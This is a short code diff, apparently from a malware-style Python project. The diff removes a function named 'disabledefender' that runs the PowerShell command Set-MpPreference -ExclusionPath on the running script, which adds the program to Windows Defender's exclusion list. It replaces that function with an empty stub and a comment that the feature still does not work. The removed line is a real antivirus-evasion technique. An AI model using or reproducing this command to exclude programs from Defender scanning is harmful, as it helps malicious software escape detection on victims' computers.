@@ -1,7 +1,5 @@
 ### NOT WORKING AT THE MOMENT, WE ARE WORKING ON THIS :)
-class disabledefender():
-    import subprocess
-    from sys import argv
 
-    curr = argv[0]
-    subprocess.run(f"Set-MpPreference -ExclusionPath {curr}", shell=True)
+## Still not working lmao, will work on it later - 19/04/23 xpierroz
+def disabledefender():
+    return
